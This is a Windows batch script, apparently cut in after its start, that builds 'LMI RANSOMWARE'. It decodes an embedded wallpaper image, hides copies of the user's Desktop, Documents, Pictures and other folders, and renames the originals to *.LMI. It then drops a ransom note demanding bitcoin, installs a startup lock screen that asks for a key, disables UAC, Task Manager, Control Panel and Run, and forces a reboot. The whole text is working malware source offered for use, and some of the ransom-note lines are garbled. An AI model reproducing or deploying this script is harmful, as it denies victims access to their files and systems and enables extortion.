echo HOzBveMyP6w6bWJO5ajpanUtH91CWW34NtOtsR848amlRHOTAsfKcgk/+gK32eeQ>>BG.txt
echo 8paOTSuc1ozmpU+Dr6XtC31cGfIpymeipNhN+0ke71yB/JS+6+Z0z+rrQ7c7HNbx>>BG.txt
echo NMna/y55HZo9XyupUWtdS3zwr2hZJPtmlHkaf1aMI2018H6GS/2KF5t8IsnmGS9l>>BG.txt
echo QKDogjpnyH4wMFymy5V4oyZp6eRzTiYuL1O7OaZEsqdmsIswqJes1lcN96czD55N>>BG.txt
echo d7rGR54pcDEhNGLzQr/dMF7GNu8or29K+wdt8o9IymXPALyLwV935WeKHr65wFkE>>BG.txt
echo OI18p366ygDwQ3p3fBlDpJ/BNxd46NobH/BVdXv0442Jn64yAPyYOuta/yl8e4Gr>>BG.txt
echo +tB2BzsT+lk/XWUAAAAAAAAAAAAAAAAAAAAAz9n466jrj0btmbwiFtVgU/J+mAEA>>BG.txt
echo fg21v96GXLdDbmW4Xc4e/CU4doeDXIrD3+21aVr5Kbu/0ZfctQMAfhHpgpV6Q1l/>>BG.txt
echo VSO9utEg12KLV03yL+SX+ACAn90uNICfwtVCutDO6V0iwtWZXbg4vW4oAPzUbvXu>>BG.txt
echo C0u54LxI92OQS5Xv5SL1DndnAPCL0du66g03VHaVYzn67cINOuj/A/Br0Qiwy45u>>BG.txt
echo LQK0sV8fAsq9I24IAAH8YrqPy9mszi9ZbhFgau/0rjm7eFsIAPg1+HhPb9QbaASY>>BG.txt
echo 9fhV/k48PVcUBvCrcRFgvStu0Ni119eX14+pAVx262rp728GAL+UXbv6fWY3ilW7>>BG.txt
echo tr+87B/1prFi33QrLqkO4JfTNf52ifn9bbuP/m9x0kvdPHIONIBfjp4Ivdcb8gsd>>BG.txt
echo F17WOiX23J8fwC+ou5LYrpaRXiHjwrNlPjA8NvwIBMCvZ9fq6EarZ/856Zcg0Q0R>>BG.txt
echo IIBfkPb4+SAvHATHyyPMZr01hTdEgAB+QSECdAfBNhKcIsA4EEIDCOBXZH2ArrVr>>BG.txt
echo bCQ4jQh3ISjMD4G5KCqAX0XbbOxZ3+h1EVobD9HrAYo+DRL3TRouAYCfmL8MdCMH>>BG.txt
echo wTf+2s9NN3v0D03byaQe+Pb+4tDhuqjb8CoA/LcZul0cIwEAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAPgn6/lVJH5qm7myyZe5WT2M9tS5qf83u0BWOZUbT2QyaDr28LZO5e9M>>BG.txt
echo Xs5vBPC85+c8k9tpL5nZ6uh0rt+U2wnfuXzdyO1U3/NTBF5T7S/0sjsc2ubw0n3g>>BG.txt
echo 9/a6Gg/h4jDD+lDdd+HCqeVUpnps8jtvqr6THcge3siml7/1p+P8T7x8axdF1KWe>>BG.txt
echo E+Y85UxuU88WrRTqqDuR6wtzO+vkZ/MiW1+ob/8Uv165wHsJF8DfNi8LfradzN/b>>BG.txt
echo 7K1s9a01h+VUobj1sBp6aUbt4Y3YVa3n8YLXhenL20Zvh1zcFPSkMOdJZ3KbeL5o>>BG.txt
echo hVBHJ3N9WW7POPHZvEjvLxjpiuY/9W/4FL9eucB7uf1k/TjZfeGeUYW5uk/+b63N>>BG.txt
echo 56ivllOl/amdbK1Bgz28idFajJP5H79scXBY6hnPRsxncit9pWglq6OT/QsvSuAZ>>BG.txt
echo 37v8vrnxD2tt+V78Kb6gcoF3oncBdvJbA5/XN9bT08vG39oy+lhOlcZTO5lGjMuT>>BG.txt
echo IeMr6S3cOJn/2ZfDUt/rTLKlrxStpFV12osSeMb3Lj+s/aV0l9/6Kf5o5QKvp9Pr>>BG.txt
echo 4Lut+UWHMH0jG71/4naauOfUvmvqppiasGihsNTYYfmWEWAXw6zj/J0zL4elvteZ>>BG.txt
echo ZEtfKVrBquq0F+X2jO9dftnJ32/9FH+0coHX04UIcNANeKwfVnJ0FwaH3UN+3BXm>>BG.txt
echo 3zauIazXdkMRiQe34fYikz6l/rCqUlu56S0DR0PFGDvEvN1T99jXfmKzOkx6J61E>>BG.txt
echo WQH9Q5GwLu5y7dbdvPJzS/5jHecw/uVNf4j3fBp8XmkpP1HXMf88C5nTPbjpMb1q>>BG.txt
echo ymSzkqaqfKZom9VRgiGqPpmr1q0f0U/JZ7JqPSpt+dmIo9JOKzZ/dJaTT9FsLh98>>BG.txt
echo xW22MmdapaJyvW/JTz/X8Cbww27DXYBH35e9X98Ns+qTO0a565pm5zbp4dA1t/n+>>BG.txt
echo Ydb+OKYLHYhy27hsKrttyKpZzatDG3aybXtZVQcJHSaxQ7XuLe/hYd3sB38jks9u>>BG.txt
echo /mp+3+W9ir5kh73bkVwBXa79oZFdLyU8HNbr/cItve4Ph3V7OBzc0i48na8PbmXK>>BG.txt
echo 4699M9aHy/lKS1I/+n6AMS3lvhbulm4VtCXzA+BWdjenK/Sm71xB29Xlg1RHUiR7>>BG.txt
echo siqzTKZF82ty35XxlFZV3fryHeWqfXgrrZepVK1/HZV28tmIo9Jmn1jtPhf/uFpn>>BG.txt
echo n/DpCPD3pp9Xq/V23azdN2ZapbxyxcvzyzcL4HXEuwDXPojTL/Nh7TfPMD48xvAo>>BG.txt
echo s5WjpriwNHmxOzG/i+bvPlL0zatuyltN1IZLQuwgu47uQJL3fNuMXTXr1psbPeIu>>BG.txt
echo moNlq8dQoYAyLp0n7Be/dYv7HSWclLNv+oOfIwxfm5umk5MyBtmLNzqimS21llJL>>BG.txt
echo SqHQ8mBzVodmlGT3zyV7pirPFE3XZBpQSVWdyfVGO2a3teZSyqp1utzkswnK0haf>>BG.txt
echo WIjth3Vak5MRYC+bkMtof+8qQhcOc9zaegcvzs82i1stNvAKuo+69W19F+DY6JYq>>BG.txt
echo O03Y+OoTm9uNdBguY9wzuB1z2d5mUybuKX3zlE9KDjF28A/7PO+bxo57a8tBQ0ZT>>BG.txt
echo 6x5gBbzxSw+hAZK03OJhBw2tzE3zqE/+kDyDmzD0s9ewwt4NS3U6ufU5pbLLi/rX>>BG.txt
echo tXRy3G+rEkySPV2VoSEoi1bZt8foI6coVJU2NpNcNQLcFiUIJtWaL5d9Nlo8U5Q2>>BG.txt
echo VuwfPoEwXrwMizqhaNrSGi2nq0D/XRW+EEf7NgtbjXl5ftnnCryKXeOORw5t8+i3>>BG.txt
echo u2EtQZyFZLoRD7Yp54a1vtiGdsm/EAIzPxX3xTpFhX5TjpPyPR9jB59dkfc+nO8W>>BG.txt
echo FriJh0zOXg/AOm1ltkXC8iQunva22NFfdsHfhINrLYuVKCzljmTlcfAzWQBoWcSm>>BG.txt
echo yI4Fn032dFUeDYJ0/hskrMmQHWU6VjCt2Umucgi7LWaPimotl4t1Nh0EyUubVaxb>>BG.txt
echo /XCwvGyzhkhnLyJA61C2pbZhldaS/bQBfEF+s1aWzD5X4FV0V5V1Qif2ZV5r9HLi>>BG.txt
echo F04W+aUIcO6WWK7D1jlPEeBteE0bwLjty7d+jB2yXUcn4oa/bw62Q2Q032F7K6PN>>BG.txt
echo cgRcJpx1aoU3YpNU7n6hiXOv+5KGothMtYVm4mTZ48j3s8mersrTRfvDaqyolTC1>>BG.txt
echo lLhomqvPLYTKZ+jy5XLxs8mqS9QSqWlp43rJWocEvhYBxsL7kwyWf1ga9mpMMnhx>>BG.txt
echo fifPMAV+QOy4C+4fHlvdlveN78eSTqNS3Eh3ISiyPsA4ZYcx7ps77BXaJMTJG592>>BG.txt
echo jADlwRkfPrUSXMY91e0HGpwWZAi638vY843EBjEJKXQW0oSyWj/ZdPdLu5QGeJaO>>BG.txt
echo zbQLB/VezELKbpOxpXs+2ZNVebporR8i8MpoR7Oz2DzlKvO42tp+eqZtuK/dR+qX>>BG.txt
echo L5fLPoxQ20o+zaWWNvsA3YsxAY3IRPwUrc0T8gn5mM+9t4yrtJYjhrKqnK/ntwwR>>BG.txt
echo oGUPvJLQB2j+d+3H53QrlEBrTFt6sI1BWRdO+JNN+NQocIgEtEmIgYGbxX2lx9hB>>BG.txt
echo X12lvLNdctium2ZVNh3a3n5e+J7Ird/TUsKjT/h7IkA9KLd0bKYY4Topi31W9pcl>>BG.txt
echo 6+Z2b0+rMhXNSutfcIGUPy9kXs2rfJ0tu9O53jSfrmfr8PUzlX2ksV22nHQiFSBI>>BG.txt
echo pU1rPfo6Dwl8tQ/QNfxuzkupQFslt0a6cFlV3kvzS98rwOvYtfJVbTq/2VoHtI++>>BG.txt
echo 3KFV/rYIPTpOeebfifMAU3AnTUI+6WM0m9QHzTv0Aea9UlWnPfmJW2Jwe0rXfl7W>>BG.txt
echo 4QUlS2Z79O3/6WNskjRoCtKcslqhgJ0uFU+SdCz4ckafhc15JrBMyVqf1qmqDIvE>>BG.txt
echo ld35ACkOJZU0u9O5WrAUqqAUqtW/W1RCWqEw1BD50FpLmz4xWaWQgEVkwmaZjAJ3>>BG.txt
echo +1XX/a7tVewqVscN4Evzi+UHXkmnFzdQWx15tJ6m2dCs5kd7Vf+oC+zd9h4jETnQ>>BG.txt
echo i3u9HvaJuLFrUBZbn953in3Ow5qQtwQSMSk7YTY1qcrl4LuM3MujP7bM8un9sVdq>>BG.txt
echo f+Ib8aVy90tzyushALGZtvazF5HK7l+1Oc9EgJNkT1dlWKRMI0bVhRhmyUNssTQJ>>BG.txt
echo ze30j7ljtfoFiwgwrdC0D9CV9vdBv1hiIbViXxoB9sUXVrGNZUlGL8hPukGIAPHa>>BG.txt
echo yiBH99EYG9y2q8muMduHNqH384bva10gTskeIWQz9vTLO05qYBRiB/dQ5h0akKX9>>BG.txt
echo UC+PODyX2oPbqYb1ttYZsoTd63kfYIwA7aVy94sv6whlKIXN1IdjeR9nnix7jEnO>>BG.txt
echo JmstxYmqDMFpiud88NeHOLqUVZVfIqyMtGFWiHYSJotYrf4xldYvN/lscqm0cSaJ>>BG.txt
echo kMOcNp6rQtHSp+6Wut2ntmqySuEjybwwv+OCAj8mjlw49l3uNkJrAPvGwr1Ev4od>>BG.txt
echo +YGYba7xQVqjfHsf7BQw+/IOk7pB5xFgytvvTjGCqnX/HSYxynKtZ+h1rQUOMWF5>>BG.txt
echo nPYBuvLEFMuWKsWwUvZQCpnJRZ9ra+47t3Aqu3+0Ob+abPy+OK7KULRJPGfhtxzj>>BG.txt
echo R5ZdzNWS1yWsEGMjR89V3nMZOmH1Iy0jwMlnk+tjn0NZsQubOoRFnVg0K7e49xea>>BG.txt
echo bJpWfvERjihslSRzqxZzPj/d3Cw/IkC8tjZ843oaDq7qdruUY8/idC+xbfrKW7gn>>BG.txt
echo bnIp3TvhtMAwle8JdvA6rPXL2yY76RWy5fQh5e1anhh66RnXk0Mqxy6BJ1ekEyFh>>BG.txt
echo CYni4jpQfe/2uDgwo21GcNNor6f066U18WPjfqlh7d8edvJqyEKaGZvzZck6x1Up>>BG.txt
echo 3z2Xx0XTQebZUIwZx6qSutVBZScsIQVzleLzqJtYKU5RrZa0e9WqSZYLn00mK21R>>BG.txt
echo sTP9UeK2j/2HWdG0qVVd+3tVzatLPVczrpJ8QfqPZCyq6wX52Sdg5QdeRSdf07EJ>>BG.txt
echo dLvC4fDYu32o1SDuUH5R2wJKvpuXXXv3EDd9P3UodgQ/EtjdrbrdfdN88oldrg+X>>BG.txt
echo diHU1qdyGB7lwfK+83mv/Du2S7Rts/p/4cdSSa/7h16QSaSE+2xxt+81bbdc+nJ3>>BG.txt
echo bl4/pKxtqtp3s/qw6h+lvZpbUWSpR+m4GmSFbYFJ2V2k9ZVkP2kzKI6qUjNxdeYW>>BG.txt
echo 9VWzXfvhbvf6/bo9uBqTxkINnyS7UFV+KsvVJ/D4WRNyk0Pxy7asWmXxorTps/Ev>>BG.txt
echo 5x5SEJ/W2nH18fjY3CzXjQ1sFJ/ig77m2z974tosvx7FKulHIk+j5/Pbu/xul8Xn>>BG.txt
echo CryF8VJ2WdscQ8/0cza6hBmKKTVc7otg5sQsosw7GS+za4c8Y7g+lfDw7NLyXnU8>>BG.txt
echo S1qqKO7Zsk8cJ3uqKs8Wbbi/nLb436IY2A/VejqryWcTLIrSFmtdft5naMDmhQ7O>>BG.txt
echo fJWO1/uZ/F5a5cCrGg7VrA4HcPgR71yVN3kXxLeT0mYx5PeIp4Qed14ceY38gNfW>>BG.txt
echo uwObH9uTYN65Kk/8dudb+NLGAO47DV174493q7r9atP2GvkBr+6hCwO++EF19449>>BG.txt
echo V2PWefhd6tf44Kv60Hb+aqtf9yr5AQAAAAAAAAAAAAAAAAAAAK9jKK8wEm7xDwC/>>BG.txt
echo ur5Ld4abzTb1o95hHAB+fUO8oJGYy63FAeC/Q3FZ1Fm8cjIA/PLKm4TNsrt0AMAv>>BG.txt
echo bnKb2KMbjwHA326Yz+bbQ7oe0Wb1sAoDtn7ktq/91GaVZtn0aQ639GxMk7OxDhNH>>BG.txt
echo EaBvADfz+dwuBpzy8TfNtsczF0gGgNf3V9814+2hqlbh7o3b9rK673zwNjysm/3g>>BG.txt
echo 7/Tw2b1aze/1/jQyR3Xwd4TwS++HdnX5YPchq9b9MKs+ycTJCHDVNc1BQsGUz517>>BG.txt
echo becay+HQNbeEiQDeTfXQPMotyQa9x9FWLmCu0dt824xdNevWmxu99ZC0VzqH3n63>>BG.txt
echo OjSjXH54r0trmzesfUN5FAHKaYHbWq9WnOczC7c8GrnfDYD3ZLed9Bcm/+ybKW2D>>BG.txt
echo Rmnxbho77q3tHoYu7Is3+pbG7qbp5BZGemvYvd7cVScmEaCOAm8tszIfuxHirJ7c>>BG.txt
echo mQwA3lQcnZVblddyE1mbcO/pvSfjyzdVfKoxXLqjrZ9zWMubS7kl2CQClAZwa3NP>>BG.txt
echo 8rF7iA3cGALAu4qjs0vfj9fKPb9DEBff2zd6R2sn3v9bwrZ4dl9+W/CzEWAIJKf5>>BG.txt
echo zGoNBKd35waAN5VOUN51LmprD6rxLVR6r2+aRzka1ujOk5v9W8+eRYDeff3Yrk9E>>BG.txt
echo gC7S3D7qKIp/L+Yjt9fWQPIHb2YGAN8onaDcfVp+Xq/8OSnzal75xig1gO7wdN00>>BG.txt
echo q88hZHNufDfeGJo0iwD/d31wL7Q+9juKAD9dz/6w0Q6XiuUz1xfWrv0cw/ExALyP>>BG.txt
echo IgKctRKQBeWvN6quaT+nCFDejBHgrUSAXavjvycjQNe+7RtbuszHR5g3DIEAeG96>>BG.txt
echo grIjsV3Xhb4+LzaOdn5y75q7rA/QzRp7CeXlei1Ln+0DdHNYxFjm4zJoVvPQsgLA>>BG.txt
echo O7kJMdyNj+j6Rs5qMaEBXFpztWzv3BwWqMlAbowRffhog7nnIkDJp9Xh3zIf57Zd>>BG.txt
echo WVMKAO9l78cyPA3tQhff4B9jBFhryza46cHO4NPzAYsIMPQP9nIlwJMRoFtAD36L>>BG.txt
echo fJy+eQxDIPweDsA7uWlaP/o62K8xZGzXTcppL304y+9GL27a+/DNzlrupCFL5wH6>>BG.txt
echo 5rOT8G5Vuwhw4VpIa9tUiBW3ukSRj+ODS9U3YWAFAN7Wvqnuu3Ydj1fv1+1h1e18>>BG.txt
echo S9c2TdNqvNc+rlcrayMv14dLvdrpsnNzdO6Q2A8Ru1eGdXM4PN7N6qYdH/2PiEN/>>BG.txt
echo oWsb/ZwbXUKWTfmohzAEUjehUQWAtyVdf4Xh/jIcjebGy3hoOlyei9FGfWfSwXda>>BG.txt
echo kc+iticuFt2dyh4AXl0cBf77DIdqVv/tpQDw36cPp+b9fXp3rMw5MADeXde6f3/3>>BG.txt
echo Gch1Fy+2CgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>BG.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPx0ZrP/D/8dAd/5n9LrAAAAAElF>>BG.txt
echo TkSuQmCC>>BG.txt
echo -----END CERTIFICATE----->>BG.txt
Certutil -decode BG.txt BG.png>nul
del BG.txt>nul

:CH_BG
reg add "hkcu\control panel\desktop" /v wallpaper /t REG_SZ /d "%appdata%\LMI\BG.png" /f>nul
reg add "hkcu\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 6 /f>nul

:Encryption
echo @echo off >Encrypt.bat
echo xcopy %userprofile%\Desktop %appdata%\LMI\Desktop /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Downloads %appdata%\LMI\Downloads /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Videos %appdata%\LMI\Videos /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Documents %appdata%\LMI\Documents /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Music %appdata%\LMI\Music /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Pictures %appdata%\LMI\Pictures /e /h /y >>Encrypt.bat
echo cd %userprofile%\desktop>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.LMI>>Encrypt.bat
echo cd %userprofile%\Downloads>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.LMI>>Encrypt.bat
echo cd %userprofile%\Videos>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.LMI>>Encrypt.bat
echo cd %userprofile%\Documents>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.LMI>>Encrypt.bat
echo cd %userprofile%\Music>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.LMI>>Encrypt.bat
echo cd %userprofile%\Pictures>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.LMI>>Encrypt.bat
echo move %appdata%\LMI\Readme.txt %userprofile%\desktop>>Encrypt.bat

:VBS_E
cd %appdata%\LMI
echo Set objShell = CreateObject("Shell.Application") >Encrypt.vbs
echo objShell.ShellExecute "%appdata%\LMI\Encrypt.bat", "/c lodctr.exe /r", "", "runas", 0 >>Encrypt.vbs

:Decryption
echo xcopy %appdata%\LMI\Desktop %userprofile%\Desktop /e /h /y >Decrypt.bat
echo xcopy %appdata%\LMI\Downloads %userprofile%\Downloads /e /h /y>>Decrypt.bat
echo xcopy %appdata%\LMI\Video %userprofile%\Video /e /h /y>>Decrypt.bat
echo xcopy %appdata%\LMI\Documents %userprofile%\Documents /e /h /y>>Decrypt.bat
echo xcopy %appdata%\LMI\Music %userprofile%\Music /e /h /y>>Decrypt.bat
echo xcopy %appdata%\LMI\Pictures %userprofile%\Pictures /e /h /y>>Decrypt.bat
echo cd %userprofile%\Desktop>>Decrypt.bat
echo for /r %%%%i in (*.LMI) do del "%%%%i">>Decrypt.bat
echo del Readme.txt>>Decrypt.bat
echo cd %userprofile%\Downloads>>Decrypt.bat
echo for /r %%%%i in (*.LMI) do del "%%%%i">>Decrypt.bat
echo cd %userprofile%\Videos>>Decrypt.bat
echo for /r %%%%i in (*.LMI) do del "%%%%i">>Decrypt.bat
echo cd %userprofile%\Documents>>Decrypt.bat
echo for /r %%%%i in (*.LMI) do del "%%%%i">>Decrypt.bat
echo cd %userprofile%\Music>>Decrypt.bat
echo for /r %%%%i in (*.LMI) do del "%%%%i">>Decrypt.bat
echo cd %userprofile%\Pictures>>Decrypt.bat
echo for /r %%%%i in (*.LMI) do del "%%%%i">>Decrypt.bat
echo exit >>Decrypt.bat

:VBS_D
cd %appdata%\LMI
echo Set objShell = CreateObject("Shell.Application") >Decrypt.vbs
echo objShell.ShellExecute "%appdata%\LMI\Decrypt.bat", "/c lodctr.exe /r", "", "runas", 0 >>Decrypt.vbs

:Readme
echo ----What happened to my files?---->>Readme.txt
echo Your personal files are all encrypted by LMI RANSOMWARE.>>Readme.txt
echo You cannot access your files until you get your PERSONAL KEY.>>Readme.txt
echo.>>Readme.txt
echo ----How Can >>Readme.txtI get my key?---->>Readme.txt
echo Pay 200 doll>>Readme.txtars worth bitcoin by the lin>>Readme.txtk, and you'll get your personal key.>>Readme.txt
echo : %random%%r>>Readme.txtandom%@gmail.com>>Readme.txt>>Readme.txt
echo.>>Readme.txt>>Readme.txt
echo Good Luck!>>Readme.txt>>Readme.txt

:LMI
set aa=%random%%random%
echo %aa%>key.txt
cls

echo @echo off>LMI.bat
echo :a>>LMI.bat
echo color 0c>>LMI.bat
echo echo WHAT'S UP?>>LMI.bat
echo echo ----What happened to my files?---->>LMI.bat
echo echo Your personal files are all encrypted by LMI RANSOMWARE.>>LMI.bat
echo echo You cannot access your files until you get your PERSONAL KEY.>>LMI.bat
echo echo.>>LMI.bat
echo echo ----How Can >>Readme.txtI get my key?---->>LMI.bat
echo echo Pay 200 doll>>Readme.txtars worth bitcoin by the lin>>Readme.txtk, and you'll get your personal key.>>LMI.bat
echo echo : %random%%random%@gmail.com>>LMI.bat
echo echo.>>LMI.bat
echo set bb=%aa%>>LMI.bat
echo set /p key=Decryption Key: >>LMI.bat
echo if %%key%%==%%bb%% goto b>>LMI.bat
echo.>>LMI.bat
echo cls>>LMI.bat
echo goto a>>LMI.bat
echo.>>LMI.bat
echo :b>>LMI.bat
echo cls>>LMI.bat
echo echo Wright Decryption Key...>>LMI.bat
echo echo Click Any Keys to Decrypt the files>>LMI.bat
echo cd %appdata%\LMI>>LMI.bat
echo start Decrypt.vbs>>LMI.bat
xcopy /h /y %appdata%\LMI\LMI.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup"

:Regedit
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t "REG_DWORD" /d "0" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t "REG_DWORD" /d "1" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t "REG_DWORD" /d "1" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t "REG_DWORD" /d "1" /f
cls

:D_Regedit
echo @echo off>Regedit.bat
echo cd %appdata%>>Regedit.bat
echo del "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\LMI.bat">>Regedit.bat
echo Rmdir /s /q LMI /D>>Regedit.bat
echo reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t "REG_DWORD" /d "1" /f>>Regedit.bat
echo reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /f>>Regedit.bat
echo reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /f>>Regedit.bat
echo reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /f>>Regedit.bat
echo exit>>Regedit.bat

:VBS_Regedit
cd %appdata%\LMI
echo Set objShell = CreateObject("Shell.Application") >Regedit.vbs
echo objShell.ShellExecute "%appdata%\LMI\Regedit.bat", "/c lodctr.exe /r", "", "runas", 0 >>Regedit.vbs

:Run
cd %appdata%\LMI
attrib +S +H Decrypt.bat
attrib +S +H Decrypt.vbs
attrib +S +H key.txt
attrib +S +H LMI.bat
attrib +S +H Regedit
attrib +S +H Regedit.vbs
attrib +S +H Documents /D
attrib +S +H Downloads /D
attrib +S +H Music /D
attrib +S +H Pictures /D
attrib +S +H Videos /D
start Encrypt.vbs
shutdown -r -t 1
exit
